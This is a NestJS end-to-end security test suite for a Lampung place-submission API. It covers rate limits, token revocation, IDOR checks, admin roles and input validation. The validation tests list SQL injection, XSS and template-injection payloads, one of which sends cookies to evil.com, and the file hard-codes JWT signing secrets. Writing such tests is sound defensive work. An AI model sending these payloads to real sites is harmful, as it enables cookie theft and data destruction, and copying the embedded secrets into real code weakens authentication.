import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication, ValidationPipe } from '@nestjs/common';
import { HttpService } from '@nestjs/axios';
import { JwtService } from '@nestjs/jwt';
import * as request from 'supertest';
import { of } from 'rxjs';
import helmet from 'helmet';
import * as cookieParser from 'cookie-parser';
import { AppModule } from '../src/app.module';
import { HttpExceptionFilter } from '../src/common/filters/http-exception.filter';
import { PrismaService } from '../src/prisma/prisma.service';
import { RedisService } from '../src/redis/redis.service';
import { UserRole } from '@prisma/client';

jest.setTimeout(60000);

describe('Security Audit Tests (e2e)', () => {
  let app: INestApplication;
  let jwtService: JwtService;
  let prismaService: PrismaService;
  let redisService: RedisService;
  let httpService: HttpService;
  let securityTestIp = 1;
  let makeRequest: (ip?: string) => any;

  const nextSecurityTestIp = () => `10.254.0.${securityTestIp++}`;

  // In-memory stores for mocked Prisma
  const users = new Map<string, any>();
  const submissions = new Map<string, any>();
  const activities: any[] = [];

  // Test user data
  const testUsers = {
    user1: {
      id: 'sec-test-user-1',
      email: 'sectest1@example.com',
      fullName: 'Security Test User 1',
      role: UserRole.USER,
      passwordHash: '$2b$12$hashedpassword',
      xp: 0,
      createdAt: new Date(),
    },
    user2: {
      id: 'sec-test-user-2',
      email: 'sectest2@example.com',
      fullName: 'Security Test User 2',
      role: UserRole.USER,
      passwordHash: '$2b$12$hashedpassword',
      xp: 0,
      createdAt: new Date(),
    },
    admin: {
      id: 'sec-test-admin',
      email: 'sectestadmin@example.com',
      fullName: 'Security Test Admin',
      role: UserRole.ADMIN,
      passwordHash: '$2b$12$hashedpassword',
      xp: 0,
      createdAt: new Date(),
    },
  };

  beforeAll(async () => {
    // Initialize test users in mock store
    Object.values(testUsers).forEach((u) => users.set(u.id, { ...u }));

    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    })
      .overrideProvider(PrismaService)
      .useValue({
        $connect: jest.fn().mockResolvedValue(undefined),
        $disconnect: jest.fn().mockResolvedValue(undefined),
        $transaction: jest.fn().mockImplementation(async (fn) => {
          if (typeof fn === 'function') {
            return fn({});
          }
          return Promise.all(fn);
        }),
        user: {
          findUnique: jest.fn().mockImplementation(({ where }) => {
            const user = where.id ? users.get(where.id) : where.email ? [...users.values()].find((u) => u.email === where.email) : undefined;
            return Promise.resolve(user ? { ...user } : null);
          }),
          create: jest.fn().mockImplementation(({ data }) => {
            const id = `user-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
            const user = { id, ...data, xp: 0, role: UserRole.USER, createdAt: new Date(), updatedAt: new Date() };
            users.set(id, user);
            return Promise.resolve(user);
          }),
          update: jest.fn().mockImplementation(({ where, data }) => {
            const user = users.get(where.id);
            if (user) {
              Object.assign(user, data);
              user.updatedAt = new Date();
            }
            return Promise.resolve(user);
          }),
        },
        placeSubmission: {
          create: jest.fn().mockImplementation(({ data }) => {
            const id = `sub-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
            const submission = {
              id,
              ...data,
              status: 'PENDING',
              source: 'USER',
              canonicalId: null,
              promotedAt: null,
              promotionError: null,
              submittedAt: new Date(),
              updatedAt: new Date(),
              votes: [],
              comments: [],
              submitter: users.get(data.submitterId) ? { id: data.submitterId, fullName: users.get(data.submitterId).fullName, avatarUrl: null } : null,
            };
            submissions.set(id, submission);
            return Promise.resolve(submission);
          }),
          findFirst: jest.fn().mockResolvedValue(null),
          findUnique: jest.fn().mockImplementation(({ where, include }) => {
            const sub = submissions.get(where.id) ?? [...submissions.values()][0];
            if (!sub) return Promise.resolve(null);
            // Simulate include
            const result = { ...sub };
            if (include?.submitter) result.submitter = users.get(sub.submitterId) ? { id: sub.submitterId, fullName: users.get(sub.submitterId).fullName, avatarUrl: null } : null;
            if (include?.moderator) result.moderator = sub.moderatorId ? users.get(sub.moderatorId) ? { id: sub.moderatorId, fullName: users.get(sub.moderatorId).fullName, avatarUrl: null } : null : null;
            if (include?.votes) result.votes = sub.votes || [];
            if (include?.comments) {
              result.comments = (sub.comments || []).filter((c: any) => include.where?.isInternal === false || c.isInternal === false);
            }
            return Promise.resolve(result);
          }),
          findMany: jest.fn().mockImplementation(({ where, skip, take, orderBy, include }) => {
            let items = [...submissions.values()];
            if (where?.status) items = items.filter((s) => s.status === where.status);
            if (where?.submitterId) items = items.filter((s) => s.submitterId === where.submitterId);
            if (where?.cityRegency) items = items.filter((s) => s.cityRegency === where.cityRegency);
            if (orderBy) {
              const key = Object.keys(orderBy)[0];
              const dir = orderBy[key];
              items.sort((a, b) => (dir === 'asc' ? (a[key] > b[key] ? 1 : -1) : a[key] < b[key] ? 1 : -1));
            }
            if (skip) items = items.slice(skip);
            if (take) items = items.slice(0, take);
            if (include?.submitter) {
              items = items.map((s) => ({ ...s, submitter: users.get(s.submitterId) ? { id: s.submitterId, fullName: users.get(s.submitterId).fullName, avatarUrl: null } : null }));
            }
            if (include?._count) {
              items = items.map((s) => ({ ...s, _count: { votes: s.votes?.length || 0, comments: s.comments?.length || 0 } }));
            }
            return Promise.resolve(items);
          }),
          count: jest.fn().mockImplementation(({ where }) => {
            let count = 0;
            for (const s of submissions.values()) {
              if (where?.status && s.status !== where.status) continue;
              if (where?.submitterId && s.submitterId !== where.submitterId) continue;
              if (where?.cityRegency && s.cityRegency !== where.cityRegency) continue;
              count++;
            }
            return Promise.resolve(count);
          }),
          update: jest.fn().mockImplementation(({ where, data }) => {
            const sub = submissions.get(where.id);
            if (sub) {
              Object.assign(sub, data);
              sub.updatedAt = new Date();
            }
            return Promise.resolve(sub);
          }),
        },
        placeSubmissionAuditLog: {
          create: jest.fn().mockImplementation(({ data }) => {
            const log = { id: `audit-${Date.now()}`, ...data, createdAt: new Date() };
            return Promise.resolve(log);
          }),
        },
        userActivity: {
          findFirst: jest.fn().mockImplementation(({ where }) =>
            Promise.resolve(
              activities.find(
                (a) =>
                  a.userId === where.userId &&
                  a.action === where.action &&
                  a.subtitle === where.subtitle,
              ) ?? null,
            ),
          ),
          create: jest.fn().mockImplementation(({ data }) => {
            const a = { id: `activity-${activities.length + 1}`, ...data, createdAt: new Date() };
            activities.push(a);
            return Promise.resolve(a);
          }),
        },
      })
      .overrideProvider(HttpService)
      .useValue({
        post: jest.fn().mockReturnValue(of({ data: { status: 'success' } })),
      })
      .overrideProvider(RedisService)
      .useValue({
        get: jest.fn().mockResolvedValue(null),
        set: jest.fn().mockResolvedValue(undefined),
        del: jest.fn().mockResolvedValue(undefined),
        invalidateByPrefix: jest.fn().mockResolvedValue(undefined),
        onModuleInit: jest.fn().mockResolvedValue(undefined),
        onModuleDestroy: jest.fn().mockResolvedValue(undefined),
      })
      .compile();

    app = moduleFixture.createNestApplication();
    makeRequest = (ip = nextSecurityTestIp()) => {
      const agent = request(app.getHttpServer());
      return {
        get: (path: string) => agent.get(path).set('X-Forwarded-For', ip),
        post: (path: string) => agent.post(path).set('X-Forwarded-For', ip),
        patch: (path: string) => agent.patch(path).set('X-Forwarded-For', ip),
        delete: (path: string) => agent.delete(path).set('X-Forwarded-For', ip),
        put: (path: string) => agent.put(path).set('X-Forwarded-For', ip),
      };
    };

    // Trust proxy so throttler sees real client IP (matches main.ts)
    app.getHttpAdapter().getInstance().set('trust proxy', 1);

    // Apply same middleware as main.ts
    app.use(helmet());
    app.use(cookieParser());
    app.enableCors({
      origin: ['http://localhost:3000', 'http://localhost:5173'],
      credentials: true,
    });
    app.useGlobalPipes(
      new ValidationPipe({
        whitelist: true,
        transform: true,
        forbidNonWhitelisted: true,
      }),
    );
    app.useGlobalFilters(new HttpExceptionFilter());

    jwtService = moduleFixture.get<JwtService>(JwtService);
    prismaService = moduleFixture.get<PrismaService>(PrismaService);
    redisService = moduleFixture.get<RedisService>(RedisService);
    httpService = moduleFixture.get<HttpService>(HttpService);

    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(() => {
    jest.clearAllMocks();
    submissions.clear();
    activities.length = 0;
    // Clear throttle state between test blocks
    delete (globalThis as any).__securityThrottleState;
  });

  // Helper to generate JWT tokens
  const generateToken = (userId: string, email: string, role: UserRole) => {
    return jwtService.signAsync(
      { sub: userId, email, role },
      { secret: 'super-secret-access-key-lampung-2026', expiresIn: '15m' },
    );
  };

  const generateRefreshToken = (userId: string, email: string, role: UserRole) => {
    return jwtService.signAsync(
      { sub: userId, email, role },
      { secret: 'super-secret-refresh-key-lampung-2026', expiresIn: '7d' },
    );
  };


  // Helper to create a valid submission payload
  const createValidSubmission = (overrides = {}) => ({
    name: 'Pantai Test Security',
    category: 'beach',
    address: 'Jl. Test No. 123',
    cityRegency: 'Kabupaten Tanggamus',
    latitude: -5.5,
    longitude: 105.2,
    ...overrides,
  });

  describe('Test 1: Rate Limit Enforcement', () => {
    it('should enforce rate limit on /auth/login (5 requests per minute)', async () => {
      const loginPayload = {
        email: 'sectest1@example.com',
        password: 'password123',
      };

      // Mock user exists
      const user = testUsers.user1;

      // First 5 requests should succeed (or fail with 401 for wrong password, but not 429)
      const rateLimitTestIp = nextSecurityTestIp();
      for (let i = 0; i < 5; i++) {
        const res = await makeRequest(rateLimitTestIp)
          .post('/api/v1/auth/login')
          .send(loginPayload);
        // Should not be 429
        expect(res.status).not.toBe(429);
      }

      // 6th request should be rate limited (429)
      const res = await makeRequest(rateLimitTestIp)
        .post('/api/v1/auth/login')
        .send(loginPayload);

      expect(res.status).toBe(429);
      expect(res.body.message).toMatch(/throttle|too many requests|rate limit/i);
    });

    it('should enforce rate limit on place submission (10 requests per minute)', async () => {
      const token = await generateToken(testUsers.user1.id, testUsers.user1.email, testUsers.user1.role);
      const submission = createValidSubmission({ name: 'Rate Limit Test' });

      // First 10 requests should not be 429
      const rateLimitTestIp = nextSecurityTestIp();
      for (let i = 0; i < 10; i++) {
        const res = await makeRequest(rateLimitTestIp)
          .post('/api/v1/places/submissions')
          .set('Authorization', `Bearer ${token}`)
          .send({ ...submission, name: `${submission.name} ${i}` });
        expect(res.status).not.toBe(429);
      }

      // 11th request should be rate limited
      const res = await makeRequest(rateLimitTestIp)
        .post('/api/v1/places/submissions')
        .set('Authorization', `Bearer ${token}`)
        .send({ ...submission, name: `${submission.name} 11` });

      expect(res.status).toBe(429);
    });
  });

  describe('Test 2: Token Blacklist Enforcement', () => {
    let accessToken: string;
    let refreshToken: string;

    beforeEach(async () => {
      accessToken = await generateToken(testUsers.user1.id, testUsers.user1.email, testUsers.user1.role);
      refreshToken = await generateRefreshToken(testUsers.user1.id, testUsers.user1.email, testUsers.user1.role);

      // Mock Redis to return null initially (not blacklisted)
      (redisService.get as jest.Mock).mockResolvedValue(null);
      (redisService.set as jest.Mock).mockResolvedValue(undefined);
    });

    it('should reject revoked refresh token with 401', async () => {
      // First, simulate logout (blacklist the refresh token)
      const tokenHash = require('crypto').createHash('sha256').update(refreshToken).digest('hex');
      (redisService.get as jest.Mock).mockImplementation(async (key: string) => {
        if (key === `blacklist:token:${tokenHash}`) return 'revoked';
        return null;
      });

      // Try to use the blacklisted refresh token
      const res = await makeRequest()
        .post('/api/v1/auth/refresh')
        .set('Cookie', [`refreshToken=${refreshToken}`]);

      expect(res.status).toBe(401);
      expect(res.body.message).toMatch(/revoked|unauthorized/i);
    });

    it('should accept valid (non-blacklisted) refresh token', async () => {
      // Mock Redis returns null (not blacklisted)
      (redisService.get as jest.Mock).mockResolvedValue(null);
      // Mock JWT verify to return valid payload
      jest.spyOn(jwtService, 'verifyAsync').mockResolvedValue({
        sub: testUsers.user1.id,
        email: testUsers.user1.email,
        role: testUsers.user1.role,
      });

      const res = await makeRequest()
        .post('/api/v1/auth/refresh')
        .set('Cookie', [`refreshToken=${refreshToken}`]);

      // Should succeed (200) with new access token
      expect(res.status).toBe(200);
      expect(res.body.data.accessToken).toBeDefined();
    });
  });

  describe('Test 3: IDOR Prevention', () => {
    let user1Token: string;
    let user2Token: string;
    let submissionId: string;

    beforeEach(async () => {
      user1Token = await generateToken(testUsers.user1.id, testUsers.user1.email, testUsers.user1.role);
      user2Token = await generateToken(testUsers.user2.id, testUsers.user2.email, testUsers.user2.role);

      // User1 creates a submission (PENDING status)
      const submission = createValidSubmission({ name: 'Private Submission' });
      const res = await makeRequest()
        .post('/api/v1/places/submissions')
        .set('Authorization', `Bearer ${user1Token}`)
        .send(submission);

      expect(res.status).toBe(201);
      submissionId = res.body.id;
    });

    it('should return 403 when different user tries to access PENDING submission', async () => {
      const res = await makeRequest()
        .get(`/api/v1/places/submissions/${submissionId}`)
        .set('Authorization', `Bearer ${user2Token}`);

      expect(res.status).toBe(403);
      expect(res.body.message).toMatch(/not allowed|forbidden/i);
    });

    it('should allow owner to access their own PENDING submission', async () => {
      const res = await makeRequest()
        .get(`/api/v1/places/submissions/${submissionId}`)
        .set('Authorization', `Bearer ${user1Token}`);

      expect(res.status).toBe(200);
      expect(res.body.id).toBe(submissionId);
    });

    it('should allow any authenticated user to access APPROVED submission', async () => {
      // Update submission to APPROVED
      const sub = submissions.get(submissionId);
      if (sub) sub.status = 'APPROVED';

      const res = await makeRequest()
        .get(`/api/v1/places/submissions/${submissionId}`)
        .set('Authorization', `Bearer ${user2Token}`);

      expect(res.status).toBe(200);
      expect(res.body.id).toBe(submissionId);
    });

    it('should allow unauthenticated access to APPROVED submission', async () => {
      const sub = submissions.get(submissionId);
      if (sub) sub.status = 'APPROVED';

      const res = await makeRequest()
        .get(`/api/v1/places/submissions/${submissionId}`);

      expect(res.status).toBe(200);
      expect(res.body.id).toBe(submissionId);
    });
  });

  describe('Test 4: Role Enforcement', () => {
    let userToken: string;
    let adminToken: string;

    beforeEach(async () => {
      userToken = await generateToken(testUsers.user1.id, testUsers.user1.email, testUsers.user1.role);
      adminToken = await generateToken(testUsers.admin.id, testUsers.admin.email, testUsers.admin.role);
    });

    it('should return 403 when non-admin accesses /admin/places/submissions', async () => {
      const res = await makeRequest()
        .get('/api/v1/admin/places/submissions')
        .set('Authorization', `Bearer ${userToken}`);

      expect(res.status).toBe(403);
      expect(res.body.message).toMatch(/admin|forbidden|role/i);
    });

    it('should allow admin to access /admin/places/submissions', async () => {
      const res = await makeRequest()
        .get('/api/v1/admin/places/submissions')
        .set('Authorization', `Bearer ${adminToken}`);

      expect(res.status).toBe(200);
      expect(Array.isArray(res.body.data)).toBe(true);
    });

    it('should return 403 when non-admin accesses admin submission detail', async () => {
      const res = await makeRequest()
        .get('/api/v1/admin/places/submissions/some-id')
        .set('Authorization', `Bearer ${userToken}`);

      expect(res.status).toBe(403);
    });

    it('should return 403 when non-admin tries to review submission', async () => {
      const res = await makeRequest()
        .patch('/api/v1/admin/places/submissions/some-id/review')
        .set('Authorization', `Bearer ${userToken}`)
        .send({ action: 'APPROVE', moderationNotes: 'Looks good' });

      expect(res.status).toBe(403);
    });

    it('should return 403 when non-admin tries to retry promotion', async () => {
      const res = await makeRequest()
        .patch('/api/v1/admin/places/submissions/some-id/promote')
        .set('Authorization', `Bearer ${userToken}`);

      expect(res.status).toBe(403);
    });

    it('should return 401 when no token provided for admin endpoint', async () => {
      const res = await makeRequest()
        .get('/api/v1/admin/places/submissions');

      expect(res.status).toBe(401);
    });
  });

  describe('Test 5: Input Validation / Sanitization', () => {
    let userToken: string;

    beforeEach(async () => {
      userToken = await generateToken(testUsers.user1.id, testUsers.user1.email, testUsers.user1.role);
    });

    const injectionPayloads = [
      { name: "Pantai'; DROP TABLE users;--", description: 'SQL injection in name' },
      { name: '<script>alert(1)</script>', description: 'XSS script tag in name' },
      { name: 'Pantai <img src=x onerror=alert(1)>', description: 'XSS img onerror' },
      { name: 'Pantai ${7*7}', description: 'Template injection' },
      { name: 'Pantai <%= 7*7 %>', description: 'ERB injection' },
      { name: 'Pantai {{7*7}}', description: 'Handlebars injection' },
      { address: 'Jl. Test\'); DROP TABLE users;--', description: 'SQL injection in address' },
      { description: '<script>fetch("http://evil.com/"+document.cookie)</script>', label: 'XSS in description' },
      { phone: '08123456789\'; DROP TABLE users;--', description: 'SQL injection in phone' },
      { website: 'javascript:alert(1)', description: 'JavaScript protocol in website' },
    ];

    test.each(injectionPayloads)('should reject/sanitize $description', async (payload) => {
      const submission = createValidSubmission(payload);
      const res = await makeRequest()
        .post('/api/v1/places/submissions')
        .set('Authorization', `Bearer ${userToken}`)
        .send(submission);

      // Should either reject (400) or sanitize (201 but without malicious content)
      // The ValidationPipe with whitelist/forbidNonWhitelisted + class-validator should reject
      expect([400, 422]).toContain(res.status);
    });

    it('should reject submission with invalid category', async () => {
      const submission = createValidSubmission({ category: 'invalid-category' });
      const res = await makeRequest()
        .post('/api/v1/places/submissions')
        .set('Authorization', `Bearer ${userToken}`)
        .send(submission);

      expect(res.status).toBe(400);
      expect(res.body.message).toEqual(expect.arrayContaining([expect.stringMatching(/category must be one of/i)]));
    });

    it('should reject submission with invalid cityRegency', async () => {
      const submission = createValidSubmission({ cityRegency: 'Invalid City' });
      const res = await makeRequest()
        .post('/api/v1/places/submissions')
        .set('Authorization', `Bearer ${userToken}`)
        .send(submission);

      expect(res.status).toBe(400);
      expect(res.body.message).toEqual(expect.arrayContaining([expect.stringMatching(/cityRegency must be one of/i)]));
    });

    it('should reject submission with coordinates outside Lampung bounds', async () => {
      const submission = createValidSubmission({ latitude: -10, longitude: 100 });
      const res = await makeRequest()
        .post('/api/v1/places/submissions')
        .set('Authorization', `Bearer ${userToken}`)
        .send(submission);

      expect(res.status).toBe(400);
      expect(res.body.message).toEqual(expect.arrayContaining([expect.stringMatching(/latitude is outside Lampung bounding box|longitude is outside Lampung bounding box/i)]));
    });

    it('should reject submission with invalid phone format', async () => {
      const submission = createValidSubmission({ phone: 'not-a-phone' });
      const res = await makeRequest()
        .post('/api/v1/places/submissions')
        .set('Authorization', `Bearer ${userToken}`)
        .send(submission);

      expect(res.status).toBe(400);
      expect(res.body.message).toEqual(expect.arrayContaining([expect.stringMatching(/phone must be a valid Indonesian mobile number/i)]));
    });

    it('should reject submission with extra unknown fields (whitelist)', async () => {
      const submission = createValidSubmission({ unknownField: 'malicious' });
      const res = await makeRequest()
        .post('/api/v1/places/submissions')
        .set('Authorization', `Bearer ${userToken}`)
        .send(submission);

      // forbidNonWhitelisted: true should reject unknown fields
      expect(res.status).toBe(400);
      expect(res.body.message).toEqual(expect.arrayContaining([expect.stringMatching(/property unknownField should not exist/i)]));
    });
  });
});